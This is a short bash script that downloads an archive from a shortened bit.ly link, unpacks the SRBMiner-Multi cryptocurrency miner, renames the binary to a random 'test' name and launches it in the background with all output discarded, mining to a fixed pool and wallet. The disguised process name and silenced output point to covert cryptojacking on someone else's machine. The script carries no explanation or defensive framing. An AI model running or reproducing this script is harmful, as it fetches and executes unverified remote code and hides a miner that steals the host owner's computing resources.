#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot https://bit.ly/kontolrum

tar xvf dot

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI test$kolot

nohup ./test$kolot --algorithm aurum --pool stratum-na.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
